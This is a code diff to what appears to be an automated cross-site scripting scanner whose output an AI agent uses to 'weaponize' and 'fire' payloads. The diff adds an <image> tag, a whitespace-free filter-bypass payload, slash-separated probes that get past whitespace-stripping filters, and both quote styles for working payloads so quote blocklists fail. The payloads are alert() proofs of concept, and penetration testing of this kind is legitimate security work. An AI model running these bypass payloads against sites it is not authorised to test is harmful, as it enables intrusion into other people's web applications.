@@ -36,7 +36,7 @@ the tool chooses the payloads (you cannot supply a command or template expressio
 
 // Tag battery — one benign marker per tag so we can detect survival + encoding
 // without executing anything. The agent weaponizes a surviving tag afterwards.
-const XSS_TAGS = ["script", "img", "svg", "body", "style", "details", "a", "marquee", "input", "iframe"]
+const XSS_TAGS = ["script", "img", "svg", "body", "style", "details", "a", "marquee", "input", "iframe", "image"]
 
 // Weaponized + filter-bypass battery. Fired only AFTER a tag is seen to survive, so we can tell
 // the agent WHICH full handler payload — including alert/confirm-blacklist bypasses — reflects
@@ -58,6 +58,9 @@ const XSS_WEAPONS: ((n: string) => { payload: string; sig: RegExp })[] = [
   // 1) plain alert(), diverse tags
   (n) => ({ payload: `<svg onload=alert(${n})>`, sig: new RegExp(`onload=alert\\(${n}`, "i") }),
   (n) => ({ payload: `<img src=x onerror=alert(${n})>`, sig: new RegExp(`onerror=alert\\(${n}`, "i") }),
+  // <image> alias + slash separators + no whitespace — beats tag-allowlists that permit only <image>
+  // AND filters that strip all whitespace (the winner shape for both together).
+  (n) => ({ payload: `<image/src/onerror=alert(${n})>`, sig: new RegExp(`<image/src/onerror=alert\\(${n}`, "i") }),
   (n) => ({ payload: `<body onpageshow=alert(${n})>`, sig: new RegExp(`onpageshow=alert\\(${n}`, "i") }),
   (n) => ({ payload: `<details open ontoggle=alert(${n})>`, sig: new RegExp(`ontoggle=alert\\(${n}`, "i") }),
   (n) => ({ payload: `<marquee onstart=alert(${n})>`, sig: new RegExp(`onstart=alert\\(${n}`, "i") }),
@@ -633,7 +636,10 @@ async function probeXssPoint(
   for (const tag of XSS_TAGS) {
     if (abort.aborted || budget.sent >= budget.max) break
     const tn = nonce()
-    const res = await send(r, applyPayload(r, point,`<${tag} data-p=${tn}>`), abort, budget)
+    // Slash separator (valid HTML: `<svg/data-p=…>` parses identically to a space) so the probe
+    // survives filters that STRIP whitespace — a space would fuse `<svgdata-p=…>` and defeat the
+    // `<tag\b…` survival regex. Equivalent to a space on normal targets; the survival check is unchanged.
+    const res = await send(r, applyPayload(r, point,`<${tag}/data-p=${tn}>`), abort, budget)
     if ("error" in res) continue
     if (looksBlocked(res.status)) {
       obs.blocked = true
@@ -664,7 +670,13 @@ async function probeXssPoint(
       const { payload, sig } = make(wn)
       const res = await send(r, applyPayload(r, point, payload), abort, budget)
       if ("error" in res || looksBlocked(res.status)) continue
-      if (sig.test(res.text)) obs.weaponized.push(payload.replace(wn, "'XSS'")) // ready-to-fire (nonce → 'XSS')
+      if (sig.test(res.text)) {
+        // Emit BOTH quote styles so a quote-blocklist can't strand the lead: e.g. a filter that
+        // bans the single quote ' leaves alert("XSS") as the only firing form. Double-quote first
+        // (marginally rarer in blocklists); the model fires the first that survives its filter.
+        obs.weaponized.push(payload.replace(wn, '"XSS"'))
+        obs.weaponized.push(payload.replace(wn, "'XSS'"))
+      }
       await sleep(delayMs)
     }
   }
